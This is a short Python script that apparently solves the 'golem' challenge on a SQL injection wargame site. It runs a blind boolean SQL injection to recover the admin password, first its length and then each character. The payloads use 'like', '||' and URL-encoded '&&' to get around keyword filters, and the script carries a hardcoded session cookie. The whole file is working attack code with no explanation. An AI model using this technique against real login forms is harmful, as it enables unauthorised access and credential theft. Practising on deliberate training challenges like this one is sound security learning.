import requests
import string

header = {"Cookie": "PHPSESSID=f0qtti1vj4ignho60h43jjqe12;"}
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?pw=' || id like 'admin' %26%26 length(pw) like {}%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        data = "?pw=' || id like 'admin' %26%26 ascii(mid(pw,{},1)) like {}%23".format(idx,ord(i))
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)